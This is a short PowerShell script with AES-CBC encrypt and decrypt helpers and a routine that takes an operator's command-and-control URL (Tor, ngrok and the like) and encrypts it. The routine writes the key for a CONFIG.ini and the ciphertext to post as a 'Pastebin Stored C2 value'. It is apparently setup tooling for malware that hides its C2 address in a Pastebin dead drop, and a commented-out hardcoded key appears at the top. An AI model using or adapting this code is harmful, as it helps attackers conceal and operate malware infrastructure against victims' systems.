#$key = "IQGy51H8i0eH4CXKt4s7UG8zKFapb1yTddQaGWsZTz0="
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}
 
function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}
 
function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
   # $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}
 
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
#    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
 
function PastebinStoredC2Value ($MyC2Url) {
	$key = Create-AesKey
	echo "Edit CONFIG.ini with keytoreadgetc2 ---->   $key" >  prepareC2.txt
	$unencryptedString = $MyC2Url
	$encryptedString = Encrypt-String $key $unencryptedString
	echo "Edit Pastebin Stored C2 value with ---->   $encryptedString" >>  prepareC2.txt
	
	$backToPlainText = Decrypt-String $key $encryptedString
	if ($unencryptedString -ne $backToPlainText) {
		echo "encryption didnt work!" >>  pastebin.txt
	}
	else {
		echo "Test decryption ---->   $backToPlainText" >>  prepareC2.txt
	}
}
$ngrokUrl = Read-Host -Prompt 'Type your C2 URL (tor,ngrok,...): '
PastebinStoredC2Value $ngrokUrl